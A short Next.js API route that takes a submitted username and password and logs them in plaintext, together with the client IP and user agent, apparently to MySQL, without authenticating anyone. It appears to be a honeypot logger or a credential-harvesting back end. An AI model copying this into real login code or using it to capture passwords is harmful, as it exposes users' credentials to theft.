import { NextRequest, NextResponse } from "next/server";
import { logLoginAttempt } from "./store";

export async function POST(req: NextRequest) {
    try {
        const { username, password } = await req.json();
        const ip = req.headers.get("x-forwarded-for") || req.headers.get("cf-connecting-ip") || "Unknown IP";
        const userAgent = req.headers.get("user-agent") || "Unknown Agent";

        // Log the login attempt to MySQL
        await logLoginAttempt(username, password, ip, userAgent);

        return NextResponse.json({ message: "Login attempt recorded." }, { status: 200 });
    } catch (error) {
        return NextResponse.json({ error: "Internal Server Error" }, { status: 500 });
    }
}
